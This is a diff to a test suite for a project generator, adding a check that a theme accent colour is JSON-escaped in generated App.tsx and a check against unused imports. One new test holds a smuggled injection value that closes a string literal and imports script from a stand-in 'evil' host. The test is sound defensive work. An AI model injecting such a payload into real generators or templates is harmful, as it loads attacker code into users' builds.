@@ -57,8 +57,26 @@ describe('generateProject (widget + mock core)', () => {
 
   it('theme accent lands as --kai-color-primary; mode maps onto the theme prop', () => {
     const files = generateProject(construct({ theme: { accent: '#e91e63', mode: 'dark' } }));
-    expect(file(files, 'src/App.tsx')).toContain("'--kai-color-primary': '#e91e63'");
+    expect(file(files, 'src/App.tsx')).toContain('\'--kai-color-primary\': "#e91e63"');
     expect(file(files, 'src/element.tsx')).toContain("theme: 'dark' as 'light' | 'dark' | 'auto'");
+  });
+
+  it('a hostile accent cannot break out of the emitted string literal', () => {
+    // The schema places no charset constraint on `accent` ("any CSS color"); a
+    // value containing a single quote must not let attacker-controlled text
+    // become live source in the emitted App.tsx (e.g. closing the literal and
+    // injecting a new statement/import).
+    const hostile = "red'}; import('http://evil/x.js'); const y='";
+    const app = file(generateProject(construct({ theme: { accent: hostile } })), 'src/App.tsx');
+    // The raw payload must never appear unescaped/unquoted in the source.
+    expect(app).not.toContain(`'--kai-color-primary': '${hostile}'`);
+    // It must appear only inside a properly JSON-escaped string literal — i.e.
+    // the single quote in the payload is escaped, so it cannot terminate the
+    // literal early.
+    expect(app).toContain(`'--kai-color-primary': ${JSON.stringify(hostile)}`);
+    // The raw text right after the property, unescaped, must never be followed
+    // by an unescaped `'` — i.e. no bare `'red'` breakout.
+    expect(app).not.toMatch(/'--kai-color-primary': 'red'/);
   });
 
   it('uiSpec overrides the @kitn.ai/ui dependency; default is ^<kit version>', () => {
@@ -66,6 +84,15 @@ describe('generateProject (widget + mock core)', () => {
       JSON.parse(file(generateProject(construct(), spec ? { uiSpec: spec } : {}), 'package.json'));
     expect(pkg('file:../kitn-ui.tgz').dependencies['@kitn.ai/ui']).toBe('file:../kitn-ui.tgz');
     expect(pkg().dependencies['@kitn.ai/ui']).toMatch(/^\^\d+\.\d+\.\d+$/);
+  });
+
+  it('emits no unreferenced imports (the generated tsconfig sets noUnusedLocals)', () => {
+    // A named import with no reference anywhere else in the file fails TS6133
+    // under the emitted project's own tsconfig.json (noUnusedLocals: true).
+    // Grepping for a bare, never-referenced `type { X }` import is a cheap
+    // proxy for that without running tsc on the emitted string.
+    const app = file(generateProject(construct()), 'src/App.tsx');
+    expect(app).not.toContain("import type { MessagePart } from '@kitn.ai/ui/solid';");
   });
 
   it('emits no non-kit utility classes (interior styling rule)', () => {
